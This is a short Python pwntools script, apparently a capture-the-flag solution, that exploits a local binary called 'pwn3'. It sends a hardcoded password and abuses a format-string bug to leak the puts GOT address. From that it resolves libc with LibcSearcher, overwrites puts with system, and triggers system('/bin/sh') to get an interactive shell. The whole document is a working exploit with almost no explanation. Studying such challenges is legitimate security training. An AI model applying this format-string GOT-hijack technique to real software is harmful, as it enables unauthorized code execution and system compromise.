from pwn import *
from LibcSearcher import LibcSearcher

sh = process("./pwn3")
pwn3 = ELF("./pwn3")

sh.recvuntil("sm):")
# ++src[i] -> password
sh.sendline("rxraclhm")

# write fmt str
sh.sendline("put")
sh.recvuntil("upload:")
sh.sendline("name")
sh.recvuntil("content:")

puts_got = pwn3.got['puts']
fmtstr = b"%8$s" + p32(puts_got)
sh.sendline(fmtstr)

# read puts addr
sh.sendline("get")
sh.recvuntil("get:")
sh.sendline("name")
puts_addr = u32(sh.recv()[:4])

# get libc
libc = LibcSearcher("puts", puts_addr)
libc_base = puts_addr - libc.dump("puts")
sys_addr = libc_base + libc.dump("system")

payload = fmtstr_payload(7, {puts_got : sys_addr})

sh.sendline("put")
sh.recvuntil("upload:")
# as an argument for to put(system)
sh.sendline("/bin/sh;")
sh.recvuntil("content:")
sh.sendline(payload)

# hijack got
sh.sendline("get")
sh.recvuntil("get:")
sh.sendline("/bin/sh;")

# get shell
sh.sendline("dir")
sh.interactive()
